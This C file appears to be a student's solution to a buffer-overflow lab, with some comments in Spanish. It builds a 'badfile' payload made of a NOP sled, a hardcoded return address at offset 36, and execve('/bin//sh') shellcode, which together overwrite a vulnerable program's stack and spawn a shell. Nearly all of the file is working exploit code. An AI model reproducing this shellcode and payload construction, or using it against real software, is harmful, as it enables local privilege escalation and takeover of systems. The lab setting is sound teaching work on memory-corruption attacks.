/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[] =
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

/* La dirección original es 0xbfffeb60 pero estamos en una arquitectura
little-endian, por lo que los bytes hay que cargarlos en orden inverso. El string
se carga en orden normal porque un string es un dato compuesto por chars, no un tipo
atómico de múltiples bytes, pero las direcciones se guardan (y por lo tanto se leen) al revés */
char newra[] = "\x60\xeb\xff\xbf";

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */

    memcpy(buffer + 36, newra, 4); // Copio la dirección en la que quiero a la que el programa retorne.
    memcpy(buffer + 40, shellcode, 24); // Si pongo sizeof(shellcode) también copia el caracter nulo

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

